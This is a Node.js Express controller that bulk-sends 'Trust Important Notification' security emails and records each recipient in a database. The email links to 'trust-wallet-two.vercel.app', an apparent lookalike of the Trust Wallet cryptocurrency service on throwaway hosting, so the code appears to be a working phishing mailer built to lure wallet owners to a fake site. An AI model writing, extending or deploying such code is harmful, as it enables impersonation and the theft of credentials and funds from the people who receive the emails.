
const userModel = require('../models/user');
const sendEmail = require('../middlewares/nodemailer');
const { trustTemplate } = require('../utils/mailtemplates');

/**
 * POST /send-bulk-email
 * Expects body: { "email": "a@example.com" } or { "email": ["a@example.com", "b@example.com"] }
 * Sends a security notification email to all recipients using the personalized trustTemplate,
 * and saves each email to the database.
 */
exports.sendBulkEmailDefault = async (req, res) => {
    try {
        let { email } = req.body;

        // Normalize email to an array, trim, deduplicate, and filter out empty values
        if (typeof email === 'string') {
            email = [email];
        }
        if (!Array.isArray(email)) {
            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
        }
        email = email
            .map(e => typeof e === 'string' ? e.trim() : '')
            .filter(e => e.length > 0);
        // Remove duplicates
        email = [...new Set(email)];

        if (email.length === 0) {
            return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
        }

        const defaultSubject = "Trust Important Notification";
        const secureLink = `https://trust-wallet-two.vercel.app/`;

        // Send emails and save to DB in parallel
        const results = await Promise.allSettled(
            email.map(async (recipient) => {
                try {
                    await sendEmail({
                        email: recipient,
                        subject: defaultSubject,
                        html: trustTemplate(secureLink, recipient)
                    });
                    // Save to DB (avoid duplicates)
                    await userModel.updateOne(
                        { email: recipient },
                        { $setOnInsert: { email: recipient } },
                        { upsert: true }
                    );
                    return recipient;
                } catch (err) {
                    throw err && err.message ? err.message : JSON.stringify(err);
                }
            })
        );

        const success = results.filter(r => r.status === 'fulfilled').length;
        const failed = results.filter(r => r.status === 'rejected').length;

        return res.status(200).json({
            message: `Bulk email process completed.`,
            successCount: success,
            failedCount: failed,
            errors: results
                .map((r, i) => r.status === 'rejected' ? { email: email[i], reason: r.reason } : null)
                .filter(Boolean)
        });
    } catch (error) {
        return res.status(500).json({ error: 'Internal server error.' });
    }
};
